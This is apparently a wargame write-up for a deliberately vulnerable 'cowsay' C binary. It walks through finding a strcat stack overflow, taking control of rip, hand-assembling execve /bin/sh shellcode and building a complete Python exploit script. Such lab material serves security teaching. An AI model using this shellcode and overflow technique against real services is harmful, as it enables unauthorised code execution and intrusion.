# Shellcoding - Level 1

## Mission (Cowsay Corruption)

We've been probing a corporate network for weeks looking for a way in, but they're locked down pretty good. Fortunately, one of our networking guys found a server that seems to have a vulnerable version of `cowsay` bound to a port.

We've obtained an identical version of the binary. Can you write us an exploit for it?


## Source Code

```c
// gcc -g -I ../includes -z execstack -fno-stack-protector -no-pie -o 04_level_1 04_level_1.c
#include <stdio.h>
#include <string.h>

// Hidden for simplicity
#include "wargames.h"

void cowsay(const char * text)
{
    // Print top of speech bubble
    printf("    ");
    for (int i = 0; i < strlen(text) + 2; i++)
        printf("-");
    printf("\n");

    // Print speech text
    printf("   < %s >\n", text);

    // Print bottom of speech bubble
    printf("    ");
    for (int i = 0; i < strlen(text) + 2; i++)
        printf("-");
    printf("\n");

    // Print an ASCII cow
    printf("           \\   ^__^             \n");
    printf("            \\  (oo)\\_______     \n");
    printf("               (__)\\       )\\/\\ \n");
    printf("                   ||----w |    \n");
    printf("                   ||     ||     \n");
    printf("        .--+--o--------+------\\+/-----.\n");
}

void main()
{
    init_wargame();

    printf("------------------------------------------------------------\n");
    printf("--[ Shellcode Level #1 - Cowsay                             \n");
    printf("------------------------------------------------------------\n");

    // Buffer to hold user input & final cowsay text
    char text[128] = {};
    char buffer[128] = {};

    // Prompt the user for some cow-friendly text
    printf("Enter a string to cowsay: ");
    fgets(buffer, sizeof(buffer), stdin);
    buffer[strcspn(buffer, "\n")] = 0;

    // Build the final cowsay message, with some added mooing
    strcat(text, "mo00oooo00o0o... ");
    strcat(text, buffer);

    // Clear the original user input buffer off the stack
    memset(buffer, 0, sizeof(buffer));

    // Print the ASCII cow with the user text
    cowsay(text);

    // Exit the program / return from main
}

```


## Static Analysis

Reviewing the code we can see there is two functions. The first function `cowsay` is just used to print out the ascii text, speech bubble and some text (poiner to char array) that is supplied to the function as an argument. 


The main function is where all of the logic happens. 
- At first, the user is prompted to enter a string to cowsay 
- Next, the string that the user entered is concatonated with the text for the cowsay message.
- Finally, the ascii text, with the additional cowsay message and user added string is printed to the terminal. 


Within this function there's two char arrays (buffers), `text` and `buffer`, which are both initialised to 0 and 128 bytes in size. When the user enters a string, this will go to the `buffer` array with the new line stripped. The `text` array has the string `"mo00oooo00o0o... "` concatinated to it intially, which takes up 17 bytes out of the 128 bytes allocation, leaving 111 bytes remaining. The string entered by the user `buffer` is also concatonated to the `text` array.


The interesting thing to note here is that the user supplied string is orignally received from the `fgets` function with a size of 128 bytes and then stored in a 128 byte array. The string in this array is then concatonated to the `text` array which also has a size of 128 bytes, however this does not account for the 17 bytes already taken up in the `text` array or any check on the size of the user string being copied. As a result, there is an overflow in the array if the use supplied a string over 111 bytes. 


## Dynamic Analysis

To test the theory, first we enter a short string "Howdy ya'll!":

```gdb
------------------------------------------------------------
--[ Shellcode Level #1 - Cowsay
------------------------------------------------------------
Enter a string to cowsay:
>> Howdy Ya'll!
    -------------------------------
   < mo00oooo00o0o... Howdy Ya'll! >
    -------------------------------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||
        .--+--o--------+------\+/-----.
==== EXECUTION FINISHED ====
```

As we can see, our text is print the terminal screen in the message. 


Next, We'll create a python script to send 111 A's plus an additional 8 B's and 8 C's:


```python
import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
data = p.readuntil('Enter a string to cowsay: ')
p.sendline('A' * 111 + 'B' * 8 + 'C' * 8)

p.interactive()
```

```gdb
$ python3 exploit.py
    -------------------------------------------------------------------------------------
-------------------------------------------------------------
   < mo00oooo00o0o... AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC >
    -------------------------------------------------------------------------------------
-------------------------------------------------------------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||
        .--+--o--------+------\+/-----.
```

As expected, this input causes a segmentation fault:

```gdb
rax: 0x0000000000000028
rbx: 0x0000000000000000
rcx: 0x00000000fbad2887
rdx: 0x00007f00005ee780
rsi: 0x00007f00005ed6a3
rdi: 0x0000000000000001
rbp: 0x4242424242424242
rsp: 0x00007fffffffede0
rip: 0x4343434343434343
r8:  0x00007f0000026e40
r9:  0x00007f0000026e40
r10: 0x0000000000000090
r11: 0x00007fffffffed50
r12: 0x00000000004007d0
r13: 0x00007fffffffeeb0
r14: 0x0000000000000000
r15: 0x0000000000000000
fs:  0x0000000000000000
gs:  0x0000000000000000
eflags: 0x0000000000000004
```
Looking at the `rbp` register, we can see that the 8 B's in our input has cleanly overwritten the register. Reviewing the `rip` register, we can see the additional 8 C's we sent has overwritten the register also, giving us control over the execution flow.



## Getting a Shell

In order to solve the level, we need to get a shell and capture the flag. Do do this, we need to code our own assembly instructions and get the opcodes and bytes from the disassembly. Before coding the assembly instructions, we need to keep in mind 2 things: 

1. The x86-64 calling convention for syscalls
2. The function prototype for the Exceve syscall, that we will use to obtain a shell

### Exceve

When using shellcode, we need to execute operating system functions such as read, write or running binaries by using syscalls. Each syscall available to the operating system has a number assigned to it.


The function prototype for exceve is:

```c
int execve(const char *pathname, char *const argv[],
                  char *const envp[]);
```
Looking at the function prototype, we need to supply a pointer to the file name as the first argument. The second argument `argv` is an array of pointers to strings that can be supplied as aguments to the exceve call. The `envp` is another optional parameter that is an array to pointers of strings. 


For our case, when we want to call exceve in our shellcode, we'll only need the file name, so the other values can be NULL. The call will be:

```c
int exceve(*pathname, NULL, NULL)
```
Of course we'll have to be carefull about supplying null bytes in the shellcode as this would terminate the string prematurely, but we'll come back to that later.


### Linux x86-64 Calling Conventions with Syscalls

For syscalls, the calling convention when broken down to assembly instructions are as follows:

Syscall Number -> EAX register
ARGV [0] -> RDI register
ARGV [1] -> RSI register
ARGV [2] -> RDX register
ARGV [3] -> R10 register
ARGV [4] -> R8 register
ARGV [5] -> R9 register


Considering the above, we'll have to get the syscall number for exceve `59` into RAX first. Secondly, we'll need to add the pointer (address) to the string of the filename and get that into the RDI register. RDX will need to be NULL, and we should be able to leave other 3 registers as is. Since we need RDX to be null, we add the instruction `xor rdx,rdx` to cause the value to be NULL, without explicitly setting a NULL byte. The assembly instructions are below:  

```asm
xor rax, rax
push rax
mov r10, 0x68732f6e69622f2f
push r10
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov al, 0x3b
syscall
```
This will disassemble to the following:

```gdb
Disassembly:
0:  48 31 c0                xor    rax,rax
3:  50                      push   rax
4:  49 ba 2f 2f 62 69 6e    movabs r10,0x68732f6e69622f2f
b:  2f 73 68
e:  41 52                   push   r10
10: 48 89 e7                mov    rdi,rsp
13: 48 31 f6                xor    rsi,rsi
16: 48 31 d2                xor    rdx,rdx
19: b0 3b                   mov    al,0x3b
1b: 0f 05                   syscall
```

Combining the byte instructions containing the opcodes and our assembly code, we get the following raw bytes for our shellcode:

```
4831C05049BA2F2F62696E2F736841524889E74831F64831D2B03B0F05
```
Using python, we can format this a little better, ready to be added to a string:

```python
"\x48\x31\xC0\x50\x49\xBA\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x41\x52\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05"
```

With this knowledge, we can build the final exploit code, which will take into account sizing and byte alignment:

```python
import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

shellcode = "\x48\x31\xC0\x50\x49\xBA\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x41\x52\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05\x90\x90\x90"

p = interact.Process()
data = p.readuntil('Enter a string to cowsay: ')
p.sendline('A' * 79 + shellcode + 'B' * 8 + '\xb0\xed\xff\xff\xff\x7f\x00\x00' )

p.interactive()
```

The final string `\xb0\xed\xff\xff\xff\x7f\x00\x00` is the address of where our shellcode begins. When debugging orignally, we had 8 bytes for the return address and 8 bytes for old rbp value. In the code above this maps to the 8 B's and the return address. Just before the B's we add the shellcode, which has a size of 32 bytes. The three '\x90' NOP bytes are added to the raw shell code we produced to help it align to 32 bytes.

To visualise this, we can see it in the debugger: 

```gdb
wdb> x/16gx $rsp-0x80
0x7fffffffed60: 0x4141414141414120    0x4141414141414141
0x7fffffffed70: 0x4141414141414141    0x4141414141414141
0x7fffffffed80: 0x4141414141414141    0x4141414141414141
0x7fffffffed90: 0x4141414141414141    0x4141414141414141
0x7fffffffeda0: 0x4141414141414141    0x4141414141414141
0x7fffffffedb0: 0x2f2fba4950c03148    0x524168732f6e6962
0x7fffffffedc0: 0x3148f63148e78948    0x909090050f3bb0d2
0x7fffffffedd0: 0x4242424242424242    0x00007fffffffedc0
```

